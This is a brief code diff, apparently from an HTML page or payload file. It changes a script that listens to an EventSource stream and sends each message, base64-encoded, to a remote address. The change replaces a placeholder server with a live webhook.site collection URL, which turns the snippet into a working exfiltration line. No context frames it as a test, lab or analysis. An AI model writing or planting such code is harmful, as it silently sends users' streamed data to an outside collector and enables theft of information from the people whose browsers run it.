@@ -8,7 +8,7 @@ const es = new EventSource(
 );
 
 es.onmessage = (e) => {
-  fetch("https://your-server.com/log?d=" + btoa(e.data));
+  fetch("https://webhook.site/48c7ae5c-b883-4d12-a3aa-97ca4adbf87e?d=" + btoa(e.data));
 };
 </script>
   
